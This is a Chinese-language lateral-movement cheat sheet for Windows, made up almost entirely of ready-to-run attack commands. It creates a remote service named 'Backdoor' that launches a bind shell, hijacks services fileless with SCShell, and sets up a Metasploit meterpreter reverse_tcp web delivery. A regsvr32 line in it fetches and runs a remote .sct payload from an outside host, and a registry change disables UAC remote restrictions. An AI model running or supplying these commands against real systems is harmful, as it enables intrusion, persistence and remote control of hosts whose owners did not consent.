# 利用系统服务

#### sc创建远程服务

建立IPC$连接

```
net use \\10.10.10.22\IPC$ "P@ssW0rd!" /user:"Administrator"
```

利用sc创建后门系统服务

```
sc \\10.10.10.22 create Backdoor binpath= "cmd.exe /k C:\bind_tcp4567.exe"
```

sc启动服务

```
sc \\10.10.10.22 start Backdoor
```

sc删除服务

```
sc \\10.10.10.22 delete Backdoor
```

#### SCShell创建服务(无文件落地)

关于SCShell

* https://raw.githubusercontent.com/Mr-Un1k0d3r/SCShell/master/SCShell.exe
* 利用系统服务，无文件横向移动工具
* 利用用户凭证
* 通过ChangeServiceConfigAPI修改远程主机系统服务
* 替换二进制路径对服务进行重用，运行结束恢复服务配置
* 需已知远程主机上的系统服务

```
[[SCShell]].exe <Target> <service name> <payload> <Domain> <Username> <Password>

SCShell.exe 10.10.10.22 defragsvc "C:\Windows\System32\cmd.exe /c calc" . Administrator P@ssW0rd!
```

**Regsvr32执行外部SCT文件上线：**

起Web Delivery 生成Regsvr32 payload

```
msfconsole
use exploit/multi/script/web_delivery
set lhost xxxx
set payload windows/x64/meterpreter/reverse_tcp
set target Regsvr32
```

SCShell执行

```
SCShell.exe 192.168.0.106 defragsvc "C:\Windows\System32\cmd.exe /c C:\Windows\System32\regsvr32 /s /n /u /i:http://192.168.0.108:8080/jBGirUm8c6t9RA.sct scrobj.dll" . Administrator P@ssW0rd!
```

#### UAC Remot Restrictions

关闭远程限制

```
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
```
